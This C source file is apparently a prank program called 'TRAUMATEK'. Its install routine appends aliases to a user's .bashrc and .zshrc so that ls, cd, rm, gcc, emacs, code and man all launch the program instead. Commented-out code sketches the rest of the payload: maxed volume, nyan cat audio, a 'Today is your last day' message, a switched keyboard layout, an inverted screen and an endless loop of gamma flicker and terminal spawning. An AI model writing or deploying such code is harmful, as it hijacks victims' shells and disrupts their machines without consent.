#include <stdlib.h>
#include <time.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <SFML/Audio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int my_strlen(const char *str)
{
    int i = 0;
    for (; str[i]; ++i);
    return i;
}


void my_strcopy(char *out, const char *src)
{
    int i = 0;
    for (; src[i]; ++i)
        out[i] = src[i];
    out[i] = 0;

}

char *my_strcat(char *out, char *in)
{
    int out_size = my_strlen(out) + my_strlen(in);
    char *tmp = malloc(sizeof(char) * out_size + 1);

    my_strcopy(tmp, out);
    my_strcopy(tmp + my_strlen(out), in);
    free(out);
    free(in);
    tmp[out_size] = 0;
    return tmp;
}




static char *get_bufs(int fd, int buf_size)
{
    char *buf = malloc(sizeof(char) * buf_size + 1);
    char *final_buf = malloc(sizeof(char));
    int read_ret = buf_size;
    final_buf[0] = 0;

    while (read_ret == buf_size) {
        read_ret = read(fd, buf, buf_size);
        if (buf == NULL)
            return NULL;
        buf[read_ret] = 0;
        final_buf = my_strcat(final_buf, buf);
        buf = malloc(sizeof(char) * buf_size + 1);
    }
    free(buf);
    return final_buf;
}

char *read_file(const char *path, int buf_size)
{
    int fd = open(path, O_RDONLY);
    char * out;

    if (fd == -1)
        return NULL;
    out = get_bufs(fd, buf_size);
    if (out == NULL)
        return NULL;
    close(fd);
    return out;
}

int write_file(char *path, char *str, int flags)
{
    int fd = open(path, O_WRONLY | flags);
    int out;

    if (fd == -1)
        return -1;
    out = write(fd, str, my_strlen(str));
    close(fd);
    return out;
}


void writeSlow(char *str)
{
    for (int i = 0; i < strlen(str); ++i) {
        usleep(50000);
        write(1, str + i, 1);
    }
}


void install(char *path)
{
    char *old_bashrc = read_file(path, 100);

    if (old_bashrc != NULL) {
        char *alias = strdup("\n\
alias ls=\"cd ~/.cat; ./a.out\"\n\
alias emacs=\"cd ~/.cat; ./a.out\"\n\
alias cd=\"cd ~/.cat; ./a.out\"\n\
alias code=\"cd ~/.cat; ./a.out\"\n\
alias rm=\"cd ~/.cat; ./a.out\"\n\
alias man=\"cd ~/.cat; ./a.out\"\n\
alias gcc=\"cd ~/.cat; ./a.out\"\n");
        char *newbashrc = my_strcat(old_bashrc, alias);
        write_file(path, newbashrc, 0);
    }
}

int main (int ac, char **av)
{
    if (ac > 1) {
        printf("install\n");
        install("../.bashrc");
        install("../.zshrc");
    } else {
        printf("TRAUMATEK\n");

        // sfMusic* Nyan =  sfMusic_createFromFile("nyanCat.wav");
        // sfMusic_setLoop(Nyan, sfTrue);

        // srand(time(NULL));
        // system("clear");
        // writeSlow("Today is your last day");
        // system("amixer set Master on");
        // system("amixer set Master 100%+");
        // sfMusic_play(Nyan);
        // sleep(2);

        // system("setxkbmap ru");

        // system("xrandr -o inverted");
        
        // while (1) {
        //     system("amixer set Master on");
        //     system("amixer set Master 100%+");
        //     system("xrandr --output eDP-1 --gamma 0.1:1:0.1");
        //     system("xrandr --output eDP-1 --gamma 0.1:0.1:1");
        //     system("xrandr --output eDP-1 --gamma 1:0.1:0.1");
        //     system("xrandr --output eDP-1 --gamma 0.1:1:1");
        //     system("xrandr --output eDP-1 --gamma 1:1:0.1");
        //     system("xfce4-terminal");
        // }
    }


    // sfMusic* Nyan =  sfMusic_createFromFile("nyanCat.wav");
    // sfMusic_setLoop(Nyan, sfTrue);

    // srand(time(NULL));
    // system("clear");
    // writeSlow("Today is your last day");
    // system("amixer set Master on");
    // system("amixer set Master 100%+");
    // sfMusic_play(Nyan);
    // sleep(2);

    // system("setxkbmap ru");

    // system("xrandr -o inverted");
    
    // while (1) {
    //     system("amixer set Master on");
    //     system("amixer set Master 100%+");
    //     system("xrandr --output eDP-1 --gamma 0.1:1:0.1");
    //     system("xrandr --output eDP-1 --gamma 0.1:0.1:1");
    //     system("xrandr --output eDP-1 --gamma 1:0.1:0.1");
    //     system("xrandr --output eDP-1 --gamma 0.1:1:1");
    //     system("xrandr --output eDP-1 --gamma 1:1:0.1");
    //     system("xfce4-terminal");
    // }

    return 0;
}